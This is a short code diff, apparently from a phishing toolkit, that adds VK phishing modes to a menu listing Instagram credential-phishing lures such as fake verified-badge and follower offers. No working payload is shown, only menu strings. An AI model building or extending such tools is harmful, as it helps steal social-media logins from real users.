@@ -46,6 +46,8 @@ lang_start_main_menu = {
     [ [_('{0}[{1}1{0}]{1} Standard Instagram Web Page Phishing'),            _('{0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge)')],
       [_('{0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users)'), _('{0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers)')],
       [_('{0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)')]],
+    "VK_operation_modes" :
+    [ [_('{0}[{1}1{0}]{1} Standard VK Web Page Phishing'), _('{0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)')]],
 }
 
              
